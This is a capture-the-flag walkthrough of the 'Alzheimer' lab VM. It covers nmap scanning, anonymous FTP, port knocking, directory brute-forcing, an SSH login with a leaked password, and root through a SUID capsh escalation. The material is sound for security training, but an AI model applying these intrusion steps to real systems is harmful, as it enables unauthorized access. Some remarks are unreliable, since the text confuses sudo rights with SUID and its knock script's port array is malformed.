@@ -1,1 +1,349 @@
+			ENUMERATION
+			
 
+---nmap---
+
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.69 -sS -sC -sV -A -T4 -p-   
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-28 10:29 +03
+Nmap scan report for 10.0.2.69
+Host is up (0.00070s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE    SERVICE VERSION
+21/tcp open     ftp     vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.0.2.54
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+22/tcp filtered ssh
+80/tcp filtered http
+MAC Address: 08:00:27:4D:5B:F9 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Unix
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.70 ms 10.0.2.69
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 40.73 seconds
+                           
+
+
+---ftp port is open and allows anonymous login, ssh and http ports are filtered however---
+
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/39- ALZHEIMER LINUX CTF]
+└─# ftp 10.0.2.69
+Connected to 10.0.2.69.
+220 (vsFTPd 3.0.3)
+Name (10.0.2.69:okina): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls -la
+229 Entering Extended Passive Mode (|||18462|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        113          4096 Oct 03  2020 .
+drwxr-xr-x    2 0        113          4096 Oct 03  2020 ..
+-rw-r--r--    1 0        0              70 Oct 03  2020 .secretnote.txt
+226 Directory send OK.
+
+ftp> more .secretnote.txt
+I need to knock this ports and 
+one door will be open!
+1000
+2000
+3000
+Ihavebeenalwayshere!!!
+
+---the last line can be a clue---
+
+
+ftp> get .secretnote.txt
+local: .secretnote.txt remote: .secretnote.txt
+229 Entering Extended Passive Mode (|||54488|)
+150 Opening BINARY mode data connection for .secretnote.txt (70 bytes).
+100% |***********************************|    70        1.66 MiB/s    00:00 ETA
+226 Transfer complete.
+70 bytes received in 00:00 (36.75 KiB/s)
+ftp> exit
+221 Goodbye.
+                                                                                
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/39- ALZHEIMER LINUX CTF]
+└─# ls
+alzheimer_linux_os_ctf_writeup.txt
+                                                                                
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/39- ALZHEIMER LINUX CTF]
+└─# ls -la
+total 16
+drwxr-xr-x  2 okina okina 4096 May 28 10:37 .
+drwxrwxrwx 42 okina okina 4096 May 27 23:53 ..
+-rw-r--r--  1 root  root    70 Oct  3  2020 .secretnote.txt
+-rwxrwxrwx  1 root  root  2486 May 28 10:36 alzheimer_linux_os_ctf_writeup.txt
+       
+
+
+---let's check that note---
+
+                                                                         
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/39- ALZHEIMER LINUX CTF]
+└─# cat .secretnote.txt                         
+I need to knock this ports and 
+one door will be open!
+1000
+2000
+3000
+
+
+
+---let's knock this ports using knock command, it is used to externally open the ports that are closed---
+
+
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# apt-get install knockd         
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# knock 10.0.2.69 1000 2000 3000
+        
+
+
+
+---You can also use netcat to perform knocking---
+
+nc -z 10.0.2.69 1000
+
+
+---I also created a bash script that I can use to perform port knocking, just for practice---
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# cat port_knock.sh 
+#!/bin/bash
+
+IP="10.0.2.69"
+PORTS=(1000,2000,3000)
+
+for PORT in "${PORTS[@]}"; do
+    nc -z "$IP" "$PORT"
+    sleep 1  #you can change this
+done
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# chmod +x port_knock.sh    
+
+
+
+
+---after I use the knock command, let's run another nmap scan to see if there are any ports open---
+
+
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.69 -sS -sC -sV -A -T4 -p-
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-28 10:48 +03
+Nmap scan report for 10.0.2.69
+Host is up (0.00078s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.0.2.54
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 b1:3b:2b:36:e5:6b:d7:2a:6d:ef:bf:da:0a:5d:2d:43 (RSA)
+|   256 35:f1:70:ab:a3:66:f1:d6:d7:2c:f7:d1:24:7a:5f:2b (ECDSA)
+|_  256 be:15:fa:b6:81:d6:7f:ab:c8:1c:97:a5:ea:11:85:4e (ED25519)
+80/tcp open  http    nginx 1.14.2
+|_http-server-header: nginx/1.14.2
+|_http-title: Site doesn't have a title (text/html).
+MAC Address: 08:00:27:4D:5B:F9 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.78 ms 10.0.2.69
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 50.57 seconds
+                  
+
+
+---http and ssh ports are open now---
+
+
+---check the webpage and we see a text---
+
+I dont remember where I stored my password :( I only remember that was into a .txt file... -medusa 
+
+
+---check the hidden pages and then look for a txt file---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# dirb http://10.0.2.69
+                                    
+.
+.
+.
+                                                                               
+---- Entering directory: http://10.0.2.69/admin/ ----
+                                                                               
+---- Entering directory: http://10.0.2.69/home/ ----
++ http://10.0.2.69/home/index.html (CODE:200|SIZE:34)                          
+                                                                               
+---- Entering directory: http://10.0.2.69/secret/ ----
+==> DIRECTORY: http://10.0.2.69/secret/home/                                   
++ http://10.0.2.69/secret/index.html (CODE:200|SIZE:44)                        
+                                                                               
+---- Entering directory: http://10.0.2.69/secret/home/ ----
++ http://10.0.2.69/secret/home/index.html (CODE:200|SIZE:62)                   
+                                                                               
+                                           
+
+---I scan all these pages using gobuster to find the password but it's no use---
+
+
+---If you remember in the ftp service we found a note and it said "Ihavebeenalwayshere!!!" after giving us the port numbers
+to knock---
+
+
+
+---Let's try to log in using---
+
+medusa : Ihavebeenalwayshere!!!
+
+
+
+
+
+			GAINING FOOTHOLD
+			
+
+                                                                                               
+┌──(root㉿kali)-[/home/okina]
+└─# ssh medusa@10.0.2.69          
+The authenticity of host '10.0.2.69 (10.0.2.69)' can't be established.
+ED25519 key fingerprint is SHA256:O2S8HAtlJxSTJJgIQUiIzsbSKX/qj9Thyn38JM6wsBY.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.0.2.69' (ED25519) to the list of known hosts.
+medusa@10.0.2.69's password: 
+Linux alzheimer 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Oct  3 06:00:36 2020 from 192.168.1.58
+medusa@alzheimer:~$ ls
+user.txt
+medusa@alzheimer:~$ cat user.txt 
+---First User Flag---
+
+
+
+
+---we are in and got our first flag, check for ways to priv escalate---
+			
+
+medusa@alzheimer:~$ sudo -l
+Matching Defaults entries for medusa on alzheimer:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User medusa may run the following commands on alzheimer:
+    (ALL) NOPASSWD: /bin/id
+
+
+---now we know there is SUID bit on the command id---
+
+
+medusa@alzheimer:~$ id
+uid=1000(medusa) gid=1000(medusa) groups=1000(medusa),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
+
+medusa@alzheimer:~$ find / -perm -u=s -type f 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/umount
+/usr/bin/gpasswd
+/usr/sbin/capsh
+
+			
+---I check them and discover that capsh has a possible privilege escalation vector on gtfobins---
+
+
+---We can use SUID bit's---
+
+./capsh --gid=0 --uid=0 --
+
+
+
+
+---This means that we are arranging the the user and group id's to 0, which is the root user's value---
+
+
+
+			
+			PRIVILEGE ESCALATION
+
+
+medusa@alzheimer:~$ /usr/sbin/capsh --gid=0 --uid=0 --
+
+root@alzheimer:~# whoami
+root
+s
+---just to make sure :) now let's get that flag and end this---
+
+
+root@alzheimer:~# cd /root
+root@alzheimer:/root# ls
+root.txt
+root@alzheimer:/root# cat root.txt
+---Root User Flag---
